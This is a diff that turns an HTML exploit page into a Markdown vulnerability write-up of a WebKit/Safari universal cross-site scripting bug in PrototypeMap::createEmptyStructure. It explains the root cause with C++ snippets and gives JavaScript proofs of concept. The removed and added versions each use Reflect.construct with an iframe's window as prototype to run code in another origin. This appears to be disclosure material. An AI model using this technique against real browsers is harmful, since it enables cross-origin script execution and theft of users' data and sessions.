@@ -1,12 +1,9 @@
-<body>
-<script>
+# UXSS via PrototypeMap::createEmptyStructure
 
-/*
-
-When creating an object in Javascript, its |Structure| is created with the constructor's prototype's |VM|.
+When creating an object in Javascript, its `Structure` is created with the constructor's prototype's `VM`.
 
 Here's some snippets of that routine.
-
+```cpp
 Structure* InternalFunction::createSubclassStructure(ExecState* exec, JSValue newTarget, Structure* baseClass)
 {
     ...
@@ -36,32 +33,25 @@ inline Structure* PrototypeMap::createEmptyStructure(JSObject* prototype, const 
     m_structures.set(key, Weak<Structure>(structure));
     ...
 }
+```
 
-As we can see |Structure::create| is called with prototype's |vm| and |globalObject| as arguments. So it could lead to an UXSS condition.
+As we can see `Structure::create` is called with prototype's `vm` and `globalObject` as arguments. So it could lead to an UXSS condition.
 
 Tested on Safari 10.0.2(12602.3.12.0.1) and Webkit Nightly 10.0.2(12602.3.12.0.1, r210800).
 
-*/
+Poc:
+```js
+let f = document.body.appendChild(document.createElement('iframe'));
+  f.onload = () => {
+      f.onload = null;
 
-'use strict';
+      let g = function () {};
+      g.prototype = f.contentWindow;
 
-function main() {
-    let f = document.body.appendChild(document.createElement('iframe'));
-    f.onload = () => {
-        f.onload = null;
+      let a = Reflect.construct(Function, ['return window[0].eval;'], g);
+      let e = a();
+      e('alert(location)');
+  };
 
-        let g = function () {};
-        g.prototype = f.contentWindow;
-
-        let a = Reflect.construct(Intl.NumberFormat, [], g);
-        Intl.NumberFormat.prototype.__lookupGetter__("format").call(a).constructor('alert(location)')();
-        console.log(f.contentWindow)
-    };
-
-    f.src = 'https://abc.xyz/';
-}
-
-main();
-
-</script>
-</body>
+  f.src = 'https://abc.xyz/';
+```
